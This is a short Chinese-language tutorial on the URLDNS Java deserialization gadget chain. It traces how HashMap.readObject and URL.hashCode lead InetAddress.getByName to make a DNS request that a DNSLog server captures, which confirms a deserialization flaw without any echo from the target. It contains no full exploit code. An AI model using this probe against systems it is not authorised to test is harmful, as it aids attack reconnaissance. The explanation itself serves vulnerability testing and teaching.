URLDNS链

URLDNS链是基于JDK中内置的一些类和方法，不依赖第三方依赖，只是用来验证是否有反序列化漏洞。
特点：
1、不限制jdk版本，使用Java内置类，对第三方依赖没有要求
2、目标无回显，可以通过DNS请求来验证是否存在反序列化漏洞
3、URLDNS利用链，只能发起DNS请求，并不能进行其他利用

URLDNS调用链分析

URLDNS 是一种仅用于探测的 Java 反序列化 gadget 链。它利用 java.net.URL 和 java.util.HashMap 的特性，在目标服务器上触发 DNS 请求，从而通过 DNSLog 平台确认漏洞是否存在。

完整调用栈

DNS 请求由 URL.hashCode() 方法触发。该方法用于计算 URL 对象的哈希值，其内部逻辑如下：

  • 首先检查私有字段 hashCode 是否等于 -1；
  • 若等于 -1，表示尚未计算，则调用 handler.hashCode(this) 进行实际计算；
  • 在 URLStreamHandler.hashCode() 的实现中，会调用 InetAddress.getByName(host) 来获取主机的 IP 地址（或规范化主机名），以便参与哈希值的生成；
  • 而 InetAddress.getByName() 在解析主机名时，会发起一次 DNS A 记录查询；
  • 最终，该 DNS 请求被外部 DNSLog 服务器捕获，从而证明反序列化漏洞存在。

HashMap 重写了 readObject() 方法，在反序列化时会重建哈希表，其中 hash(key) 方法会调用 key.hashCode()，当键为 URL 对象且其内部 hashCode 字段为 -1（未缓存）时，URL.hashCode() 会触发主机名解析（通过 InetAddress.getByName()），从而发起 DNS 请求，实现外带探测。

putVal(hash(key), key, value, false, false);
